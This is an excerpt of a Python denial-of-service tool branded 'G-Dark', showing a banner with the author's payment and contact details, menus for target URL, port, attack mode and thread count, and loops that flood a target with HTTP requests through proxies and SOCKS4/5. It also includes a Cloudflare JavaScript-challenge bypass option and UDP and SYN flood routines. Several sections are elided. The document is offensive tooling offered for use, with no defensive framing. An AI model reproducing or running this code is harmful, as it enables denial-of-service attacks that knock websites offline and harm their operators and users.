...
def logo():
    ...
    print('''
             - https://www.youtube.com/channel/UC4YKkBV-Is9FjmM4kr-J9eA -

╔════════════════════════════════════════════════════════════════╗
║                   ║ Admin: Nguyễn Phùng Nhật Tường  ║                                                                                          ║   
║                 ║ Momo: 0941172798                          ║                                                                                            ║
║                 ║ Zalo : 0941172798                             ║                                                                                            ║       
║                 ║ MB Bank: 438888806                        ║                                                                                            ║
║                 ║ MB Bank: 0941172798                      ║                                                                                             ║      
║                 ║ Support: Nguyễn Phùng Nhật Tường║                                                                                            ║ 
║  ███╗░░██╗████████╗████████╗░█████╗░░█████╗░██╗░░░░░                                  ║
║  ████╗░██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░                                   ║
║  ██╔██╗██║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░                                  ║
║  ██║╚████║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░                                   ║    
...
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ Bản Quyền: Nguyễn Phùng Nhật Tường (G-Dark)
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
~~~ Mail liên hệ : vui3728@gmail.com
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -''')

    try:
        print("\n[G-Dark] Target : " +str(url_main)+ ":" +str(port))
    except:
        pass
    try:
        print("[G-Dark] Method : " +str(name_method_attack))
    except:
        pass
    try:
        print("[G-Dark] Mode   : " +str(filenam2))
    except:
        pass
    try:
        print("[G-Dark] Bypass : v" +str(method_pass_cf))
        
    except:
        pass
    try:
        print("[G-Dark] Proxies: %s" %(len(open(out_file).readlines())))
    except:
        pass
    try:
        print("[G-Dark] Threads: " +str(threads))
    except:
        pass
...
def start_url():
    ...
    try:
        ...
        print("[G-Dark] You Mistyped, Try Again [!]")
        start_url()
...
def start_port():
    global port
    print("-----------------------------")
    port = str(input("[G-Dark] Port [80]: "))
    if port == '':
        if "https" in url:
                port = int(443)
                print("[G-Dark] Selected Port = 443 [!]")
        else:
            port = int(80)
            print("[G-Dark] Selected Port = 80 [!]")
    else:
        port = int(port)
...
def proxies_list():
    ...
    if sys.platform.startswith("linux"):
        ...
        for file in glob("*.txt"):
            print("|_--> " + file)
    out_file = str(input("[G-Dark] " +str(filenam2)+ " [" +str(filenam1)+ ".txt]: "))
    if out_file == "":
        out_file = str(filenam1)+".txt"
    proxies = open(out_file).readlines()
    #print ("[DDV] Number Of Proxies: %s" %(len(open(out_file).readlines())))
    numthreads()
...
def proxyget():
    ...
    f.close() 
    proxies = open(out_file).readlines()
    #print("[G-Dark] Get Proxies Successfully ( Live 100% ) [" +out_file+ "] = [ " +str(len(open(out_file).readlines()))+ " ]")
    numthreads()

def start_mode():
    global choice_mode, filenam1, filenam2, method_pass_cf
    print("""
[+]=====[ Nguyễn Phùng Nhật Tường ]=====[+]
 # 0: Home          [ HOME ] #
 # 1: Proxy         [ DDoS ] #
 # 2: Socks         [ DDoS ] #
 # 3: JS-Normal     [ Home ] #
...
[+]===========================[+]
""")
    choice_mode = input("[G-Dark] Attack Mode [0-6]: ")
    if choice_mode == "0":
        filenam2 = "Home"
        ...
        filenam2 = "JS-Bypass"
        method_pass_cf = input("[G-Dark] Method [1/2]: ")
        if (method_pass_cf == "") or (method_pass_cf == "1"):
            print("[G-Dark] Selected Method Bypass JS v1")
            method_pass_cf = "1"
        else:
            print("[G-Dark] Selected Method Bypass JS v2")
            method_pass_cf = "2"
...
def pass_cf():
    ...
    try:
        ...
        print("[G-Dark] Bypass Has Been Completed!")
        numthreads()
    except:
        error_cf += 1
        print("[G-Dark] Bypassing Again... [" +str(error_cf)+ "]")
        if error_cf>5:
            os.system("cls")
            print("[G-Dark] ERROR BYPASS\n[!] Please Select Another Attack Or Ignore Method[!]")
            start_mode()
        else:
            pass_cf()
...
def choice_method_attack():
    ...
    if (method_attack == "1") or (method_attack == ""):
        ...
        print("[G-Dark] Selected Method Attack Normal")
        method_attack = "1"
    elif method_attack == "2":
        name_method_attack = "Spam"
        print("[G-Dark] Selected Method Attack Spam")
    else:
        print ("[G-Dark] You mistyped, try again [!]\n")
        choice_method_attack()
    start_mode()
...
def choice_down_proxies():
    ...
    choice4 = input("[G-Dark] Get New List " +str(filenam2)+ " [Y/N]: ")
    if (choice4 == "y") or (choice4 == "Y"):
        print("-----------------------------")
        print("|_--> 1: Server X")
        print("|_--> 2: Server Z")
        sel_pr = input("[G-Dark] Server Get [1/2]: ")
        ...
        print("[G-Dark] Selected No Get New List " +str(filenam2)+ " [!]")
        proxies_list()
...
def numthreads():
    ...
    try:
        print("-----------------------------")
        threads = int(input("[G-Dark] Threads [2000]: "))
    except ValueError:
        threads = int(2000)
        print ("[G-Dark] Selected Threads " +str(threads)+ " [!]\n")
    
    begin()

def begin():
    choice6 = input('[G-Dark] Press "Enter" to start attack: ')
    if choice6 == "":
        ...
        if ("edu" in url) or ("vn" in url) or ("hentai" in url) or ("porn" in url):
            print("[G-Dark] Admin: Nguyễn Phùng Nhật Tường!")
            sleep(3)
        attack()
        print()
    else:
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[G-Dark] fb.com/NhatTuong.Profile.Copyright | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                #req_code += 1
                #sys.stdout.write("[DDV] fb.com/duyvinh09 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                print("[G-Dark] fb.com/NhatTuong.Profile.Copyright | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[G-Dark] fb.com/NhatTuong.Profile.Copyright | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[G-Dark] fb.com/NhatTuong.Profile.Copyright | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[G-Dark] fb.com/NhatTuong.Profile.Copyright | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[G-Dark] fb.com/NhatTuong.Profile.Copyright | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[G-Dark] fb.com/NhatTuong.Profile.Copyright | G-Dark-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
...
def udpflood():
    ...
    while True:
        ...
        try:
            req_code += 1
            s.sendto(bytes,tar)
            sys.stdout.write("[G-Dark] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes,tar)
        ...
        while True:
            ...
            try:
                ...
                try:
                    ...
                    pass
            sys.stdout.write("[G-Dark] SYN Flood [ DDoS ] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
